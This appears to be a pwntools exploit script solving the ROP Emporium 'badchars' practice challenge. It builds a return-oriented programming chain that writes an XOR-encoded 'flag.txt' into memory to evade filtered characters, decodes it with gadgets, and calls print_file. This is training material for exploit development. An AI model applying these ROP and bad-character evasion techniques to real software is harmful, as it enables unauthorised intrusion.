#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './badchars'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

offset = 40

s = 'flag.txt'
blacklist = ['x', 'g', 'a', '.'] # 616ec578
fd = []
for i in range(len(s)):
    if s[i] in blacklist:
        fd.append(chr(ord(s[i] ) ^ 1))
    else:
        fd.append(s[i])

# registers
# https://stackoverflow.com/questions/1753602/what-are-the-names-of-the-new-x86-64-processors-registers
payload = flat({
    offset: [
        rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0],
        ''.join(fd),
        elf.bss(),
        1,
        0,
        0x400634, # mov qword ptr [r13], r12; ret;

        rop.find_gadget(["pop r15", "ret"])[0],
        elf.bss() + 2,
        0x400628, # xor byte ptr [r15], r14b; ret;

        rop.find_gadget(["pop r15", "ret"])[0],
        elf.bss() + 3,
        0x400628, # xor byte ptr [r15], r14b; ret;

        rop.find_gadget(["pop r15", "ret"])[0],
        elf.bss() + 4,
        0x400628, # xor byte ptr [r15], r14b; ret;

        rop.find_gadget(["pop r15", "ret"])[0],
        elf.bss() + 6,
        0x400628, # xor byte ptr [r15], r14b; ret;
        
        rop.find_gadget(["pop rdi", "ret"])[0],
        elf.bss(),
        elf.sym['print_file']
    ]
})

io.sendlineafter(b'>', payload)
io.interactive()